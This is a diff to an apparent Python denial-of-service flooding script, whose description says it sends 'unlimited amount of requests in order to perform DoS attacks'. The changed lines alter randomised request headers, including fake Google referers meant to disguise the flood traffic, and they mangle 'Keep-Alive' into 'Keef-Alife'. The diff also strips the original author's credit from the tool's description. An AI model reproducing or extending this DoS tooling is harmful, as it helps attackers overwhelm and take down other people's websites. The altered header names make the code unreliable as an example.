@@ -59,8 +59,8 @@ def initHeaders():
 				'Cache-Control': 'no-cache',
 				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
 				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
-				'Keep-Alive': str(random.randint(110,120)),
-				'Connection': 'keep-alive'
+				'Keef-Alife': str(random.randint(110,120)),
+				'Connection': 'Keef-Alife'
 				}
 
 	if additionalHeaders:
@@ -120,11 +120,10 @@ class SendPOSTThread(threading.Thread):
 			pass
 
 
-# TODO:
 # check if the site stop responding and alert
 
 def main(argv):
-	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks.')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
 	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
 	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
